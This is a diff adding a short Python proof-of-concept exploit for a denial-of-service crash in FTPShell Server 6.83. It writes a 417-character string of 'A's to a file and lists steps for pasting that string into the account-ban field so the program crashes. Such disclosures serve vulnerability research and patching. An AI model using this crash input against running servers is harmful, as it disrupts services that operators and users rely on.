@@ -1,0 +1,22 @@
+#Exploit Title: FTPShell Server 6.83 - Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2018-02-20
+#Vendor Homepage: http://www.ftpshell.com/index.htm
+#Software Link: http://www.ftpshell.com/downloadserver.htm
+#Tested Version: 6.83
+#Tested on: Windows 7 x64 Service Pack 1
+
+#Steps to produce the crash:
+#1.- Run python code: FTPShell_Server_6.83.py
+#2.- Open ftpshell.txt and copy content to clipboard
+#3.- Open FTPShell Server
+#4.- Select "Manage FTP Accounts"
+#5.- Select "Add Account Name" > in "Account name to ban" Paste Clipboard
+#6.- Click on "Ok"
+#7.- Crashed
+
+cod = "\x41" * 417	
+
+f = open('ftpshell.txt', 'w')
+f.write(cod)
+f.close()
